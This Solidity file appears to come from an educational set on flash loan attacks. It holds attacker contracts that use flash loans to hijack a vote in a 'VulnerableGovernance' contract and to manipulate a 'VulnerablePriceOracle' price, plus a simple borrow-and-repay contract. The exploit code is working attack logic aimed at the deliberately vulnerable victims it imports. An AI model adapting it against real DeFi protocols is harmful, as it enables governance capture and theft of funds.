// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Attacker Contract: FlashLoanAttacker
// This contract exploits vulnerabilities using flash loans

import "./SC07_Flash_Loan_Attacks_Victim.sol";

contract GovernanceAttacker {
    SimpleFlashLoanProvider public flashLoanProvider;
    VulnerableGovernance public governance;
    uint256 public proposalId;
    bool public attackExecuted;
    
    event AttackInitiated(uint256 loanAmount);
    event VoteCast(uint256 proposalId, uint256 votingPower);
    event AttackCompleted(bool success);
    
    constructor(
        address payable _flashLoanProvider,
        address _governance
    ) {
        flashLoanProvider = SimpleFlashLoanProvider(_flashLoanProvider);
        governance = VulnerableGovernance(payable(_governance));
    }
    
    // Step 1: Initiate the attack by taking a flash loan
    function attack(uint256 loanAmount, uint256 _proposalId) external {
        proposalId = _proposalId;
        attackExecuted = false;
        
        emit AttackInitiated(loanAmount);
        
        // Take flash loan
        flashLoanProvider.flashLoan(loanAmount);
        
        emit AttackCompleted(attackExecuted);
    }
    
    // Step 2: This is called when we receive the flash loan
    receive() external payable {
        if (msg.sender == address(flashLoanProvider) && !attackExecuted) {
            // We received the flash loan, now exploit the governance
            uint256 loanAmount = msg.value;
            
            // Deposit ETH to get voting power
            governance.depositForVoting{value: loanAmount}();
            
            // Cast vote with massive voting power
            governance.vote(proposalId, true);
            
            emit VoteCast(proposalId, loanAmount);
            
            // Withdraw voting power to repay flash loan
            governance.withdrawFromVoting(loanAmount);
            
            // Repay flash loan
            (bool success, ) = address(flashLoanProvider).call{value: loanAmount}("");
            require(success, "Flash loan repayment failed");
            
            attackExecuted = true;
        }
    }
    
    // Fallback function
    fallback() external payable {}
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract PriceManipulationFlashAttacker {
    SimpleFlashLoanProvider public flashLoanProvider;
    VulnerablePriceOracle public priceOracle;
    bool public attackInProgress;
    
    event AttackStarted(uint256 loanAmount);
    event PriceManipulated(uint256 oldPrice, uint256 newPrice);
    event ProfitMade(uint256 profit);
    
    constructor(
        address payable _flashLoanProvider,
        address _priceOracle
    ) {
        flashLoanProvider = SimpleFlashLoanProvider(_flashLoanProvider);
        priceOracle = VulnerablePriceOracle(payable(_priceOracle));
    }
    
    function attack(uint256 loanAmount) external {
        attackInProgress = false;
        
        emit AttackStarted(loanAmount);
        
        // Take flash loan
        flashLoanProvider.flashLoan(loanAmount);
    }
    
    receive() external payable {
        // When we receive the flash loan
        if (msg.sender == address(flashLoanProvider) && !attackInProgress) {
            attackInProgress = true;
            uint256 loanAmount = msg.value;
            
            // Get initial price
            uint256 oldPrice = priceOracle.getPrice();
            
            // Use only 40% of loan to manipulate price
            uint256 swapAmount = (loanAmount * 40) / 100;
            
            // Manipulate price by swapping large amount
            priceOracle.swap{value: swapAmount}(0, true);
            
            // Get manipulated price
            uint256 newPrice = priceOracle.getPrice();
            
            emit PriceManipulated(oldPrice, newPrice);
            
            // Repay the flash loan
            (bool success, ) = address(flashLoanProvider).call{value: loanAmount}("");
            require(success, "Flash loan repayment failed");
        }
    }
    
    fallback() external payable {
        // Accept all ETH
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// Simple attacker that just borrows and repays
contract SimpleFlashLoanBorrower {
    SimpleFlashLoanProvider public provider;
    uint256 public borrowedAmount;
    bool public loanReceived;
    
    event LoanReceived(uint256 amount);
    event LoanRepaid(uint256 amount);
    
    constructor(address payable _provider) {
        provider = SimpleFlashLoanProvider(_provider);
    }
    
    function borrow(uint256 amount) external {
        loanReceived = false;
        borrowedAmount = 0;
        provider.flashLoan(amount);
    }
    
    receive() external payable {
        if (msg.sender == address(provider) && !loanReceived) {
            loanReceived = true;
            borrowedAmount = msg.value;
            
            emit LoanReceived(msg.value);
            
            // Use the borrowed funds (in this case, just hold them briefly)
            
            // Repay the loan
            (bool success, ) = address(provider).call{value: msg.value}("");
            require(success, "Repayment failed");
            
            emit LoanRepaid(msg.value);
        }
    }
    
    fallback() external payable {}
}
